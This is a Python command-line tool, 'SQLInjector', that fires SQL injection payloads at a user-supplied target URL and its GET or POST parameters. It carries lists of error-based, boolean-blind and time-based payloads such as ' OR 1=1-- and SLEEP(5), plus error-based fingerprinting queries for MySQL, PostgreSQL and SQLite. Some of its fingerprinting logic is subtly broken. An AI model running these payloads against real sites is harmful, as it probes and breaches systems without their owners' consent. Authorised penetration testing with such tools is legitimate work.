#!/usr/bin/env python3

import argparse
import requests
import time
import json
from urllib.parse import urlparse, parse_qs, urlencode
from bs4 import BeautifulSoup
from colorama import init, Fore, Style

# Initialize colorama
init()

class SQLInjector:
    def __init__(self, url, method="GET", headers=None, cookies=None, data=None):
        self.url = url
        self.method = method.upper()
        self.headers = headers or {}
        self.cookies = cookies or {}
        self.data = data or {}
        self.session = requests.Session()
        
        # Common SQL injection payloads
        self.error_based_payloads = [
            "'",
            "''",
            "\"",
            "\"\"",
            "1' OR '1'='1",
            "1\" OR \"1\"=\"1",
            "' OR 1=1--",
            "\" OR 1=1--",
            "' OR '1'='1'--",
            "1' ORDER BY 1--",
            "1' ORDER BY 2--",
            "1' ORDER BY 3--",
        ]
        
        self.boolean_based_payloads = [
            "' AND 1=1--",
            "' AND 1=2--",
            "' OR 1=1--",
            "' OR 1=2--",
        ]
        
        self.time_based_payloads = [
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' AND (SELECT * FROM (SELECT(BENCHMARK(10000000,MD5(1))))a)--",
        ]

    def test_error_based(self, param_name, param_value):
        """Test for error-based SQL injection vulnerabilities."""
        print(f"\n{Fore.CYAN}[*] Testing error-based SQL injection on parameter: {param_name}{Style.RESET_ALL}")
        
        for payload in self.error_based_payloads:
            test_value = param_value + payload
            try:
                if self.method == "GET":
                    params = {param_name: test_value}
                    response = self.session.get(self.url, params=params, headers=self.headers, cookies=self.cookies)
                else:
                    data = {param_name: test_value}
                    response = self.session.post(self.url, data=data, headers=self.headers, cookies=self.cookies)
                
                # Check for common SQL error messages
                error_indicators = [
                    "SQL syntax",
                    "mysql_fetch_array",
                    "ORA-",
                    "PostgreSQL",
                    "SQLite3::",
                    "Warning: mysql_",
                    "Microsoft SQL Server",
                    "ODBC SQL Server Driver",
                ]
                
                for indicator in error_indicators:
                    if indicator.lower() in response.text.lower():
                        print(f"{Fore.GREEN}[+] Potential SQL injection found!{Style.RESET_ALL}")
                        print(f"Payload: {payload}")
                        print(f"Error indicator: {indicator}")
                        return True
                        
            except Exception as e:
                print(f"{Fore.RED}[-] Error during testing: {str(e)}{Style.RESET_ALL}")
        
        return False

    def test_boolean_based(self, param_name, param_value):
        """Test for boolean-based blind SQL injection vulnerabilities."""
        print(f"\n{Fore.CYAN}[*] Testing boolean-based blind SQL injection on parameter: {param_name}{Style.RESET_ALL}")
        
        for payload in self.boolean_based_payloads:
            test_value = param_value + payload
            try:
                if self.method == "GET":
                    params = {param_name: test_value}
                    response = self.session.get(self.url, params=params, headers=self.headers, cookies=self.cookies)
                else:
                    data = {param_name: test_value}
                    response = self.session.post(self.url, data=data, headers=self.headers, cookies=self.cookies)
                
                # Store the response length for comparison
                true_response_length = len(response.text)
                
                # Test with false condition
                false_value = param_value + payload.replace("1=1", "1=2")
                if self.method == "GET":
                    params = {param_name: false_value}
                    false_response = self.session.get(self.url, params=params, headers=self.headers, cookies=self.cookies)
                else:
                    data = {param_name: false_value}
                    false_response = self.session.post(self.url, data=data, headers=self.headers, cookies=self.cookies)
                
                # Compare response lengths
                if len(false_response.text) != true_response_length:
                    print(f"{Fore.GREEN}[+] Potential boolean-based blind SQL injection found!{Style.RESET_ALL}")
                    print(f"Payload: {payload}")
                    return True
                    
            except Exception as e:
                print(f"{Fore.RED}[-] Error during testing: {str(e)}{Style.RESET_ALL}")
        
        return False

    def test_time_based(self, param_name, param_value):
        """Test for time-based blind SQL injection vulnerabilities."""
        print(f"\n{Fore.CYAN}[*] Testing time-based blind SQL injection on parameter: {param_name}{Style.RESET_ALL}")
        
        for payload in self.time_based_payloads:
            test_value = param_value + payload
            try:
                start_time = time.time()
                
                if self.method == "GET":
                    params = {param_name: test_value}
                    response = self.session.get(self.url, params=params, headers=self.headers, cookies=self.cookies)
                else:
                    data = {param_name: test_value}
                    response = self.session.post(self.url, data=data, headers=self.headers, cookies=self.cookies)
                
                end_time = time.time()
                response_time = end_time - start_time
                
                if response_time >= 5:  # If response time is greater than 5 seconds
                    print(f"{Fore.GREEN}[+] Potential time-based blind SQL injection found!{Style.RESET_ALL}")
                    print(f"Payload: {payload}")
                    print(f"Response time: {response_time:.2f} seconds")
                    return True
                    
            except Exception as e:
                print(f"{Fore.RED}[-] Error during testing: {str(e)}{Style.RESET_ALL}")
        
        return False

    def fingerprint_database(self):
        """Attempt to identify the database type based on error messages and behavior."""
        print(f"\n{Fore.CYAN}[*] Attempting database fingerprinting...{Style.RESET_ALL}")
        
        # Test for MySQL
        mysql_payload = "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--"
        try:
            if self.method == "GET":
                response = self.session.get(self.url + "?" + mysql_payload, headers=self.headers, cookies=self.cookies)
            else:
                response = self.session.post(self.url, data={"test": mysql_payload}, headers=self.headers, cookies=self.cookies)
            
            if "MySQL" in response.text or "mysql" in response.text.lower():
                print(f"{Fore.GREEN}[+] Database appears to be MySQL{Style.RESET_ALL}")
                return "MySQL"
        except:
            pass

        # Test for PostgreSQL
        pg_payload = "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM pg_catalog.pg_tables GROUP BY x)a)--"
        try:
            if self.method == "GET":
                response = self.session.get(self.url + "?" + pg_payload, headers=self.headers, cookies=self.cookies)
            else:
                response = self.session.post(self.url, data={"test": pg_payload}, headers=self.headers, cookies=self.cookies)
            
            if "PostgreSQL" in response.text:
                print(f"{Fore.GREEN}[+] Database appears to be PostgreSQL{Style.RESET_ALL}")
                return "PostgreSQL"
        except:
            pass

        # Test for SQLite
        sqlite_payload = "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(sqlite_version(),FLOOR(RAND(0)*2))x FROM sqlite_master GROUP BY x)a)--"
        try:
            if self.method == "GET":
                response = self.session.get(self.url + "?" + sqlite_payload, headers=self.headers, cookies=self.cookies)
            else:
                response = self.session.post(self.url, data={"test": sqlite_payload}, headers=self.headers, cookies=self.cookies)
            
            if "SQLite" in response.text:
                print(f"{Fore.GREEN}[+] Database appears to be SQLite{Style.RESET_ALL}")
                return "SQLite"
        except:
            pass

        print(f"{Fore.YELLOW}[!] Could not determine database type{Style.RESET_ALL}")
        return "Unknown"

    def run_tests(self):
        """Run all SQL injection tests on the target URL."""
        print(f"{Fore.CYAN}[*] Starting SQL injection tests on: {self.url}{Style.RESET_ALL}")
        
        # Parse URL parameters if it's a GET request
        if self.method == "GET":
            parsed_url = urlparse(self.url)
            params = parse_qs(parsed_url.query)
            
            for param_name, param_values in params.items():
                param_value = param_values[0]
                self.test_error_based(param_name, param_value)
                self.test_boolean_based(param_name, param_value)
                self.test_time_based(param_name, param_value)
        
        # Test POST data if it's a POST request
        if self.method == "POST":
            for param_name, param_value in self.data.items():
                self.test_error_based(param_name, str(param_value))
                self.test_boolean_based(param_name, str(param_value))
                self.test_time_based(param_name, str(param_value))
        
        # Attempt database fingerprinting
        self.fingerprint_database()

def main():
    parser = argparse.ArgumentParser(description="SQL Injection Testing Tool")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-m", "--method", default="GET", choices=["GET", "POST"], help="HTTP method (default: GET)")
    parser.add_argument("-H", "--headers", help="Custom headers (JSON format)")
    parser.add_argument("-c", "--cookies", help="Custom cookies (JSON format)")
    parser.add_argument("-d", "--data", help="POST data (JSON format)")
    
    args = parser.parse_args()
    
    # Parse headers, cookies, and data if provided
    headers = json.loads(args.headers) if args.headers else {}
    cookies = json.loads(args.cookies) if args.cookies else {}
    data = json.loads(args.data) if args.data else {}
    
    # Create and run the SQL injector
    injector = SQLInjector(args.url, args.method, headers, cookies, data)
    injector.run_tests()

if __name__ == "__main__":
    main() 
